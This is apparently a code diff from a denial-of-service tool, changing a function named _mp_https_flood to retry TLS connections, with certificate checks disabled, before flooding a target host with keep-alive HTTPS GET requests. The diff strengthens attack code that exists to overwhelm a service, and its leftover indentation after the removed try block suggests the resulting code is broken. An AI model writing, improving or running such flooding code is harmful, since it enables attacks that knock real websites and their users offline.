@@ -197,15 +197,27 @@ def _mp_https_flood(args_tuple):
     host, port, path, duration = args_tuple
     sent = 0
     errors = 0
-    try:
-        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
-        ctx.check_hostname = False
-        ctx.verify_mode = _ssl.CERT_NONE
-        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
-        raw.settimeout(5.0)
-        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
-        raw.connect((host, port))
-        ssock = ctx.wrap_socket(raw, server_hostname=host)
+    # TLS handshake with retry
+    ssock = None
+    for attempt in range(3):
+        try:
+            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+            raw.settimeout(5.0)
+            raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
+            raw.connect((host, port))
+            ssock = ctx.wrap_socket(raw, server_hostname=host)
+            break
+        except Exception:
+            try:
+                raw.close()
+            except Exception:
+                pass
+            _time.sleep(0.5)
+    if ssock is None:
+        return 0, 1
         
         req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                f"Connection: keep-alive\r\n"
@@ -226,8 +238,6 @@ def _mp_https_flood(args_tuple):
             ssock.close()
         except Exception:
             pass
-    except Exception:
-        errors += 1
     return sent, errors
 
 async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
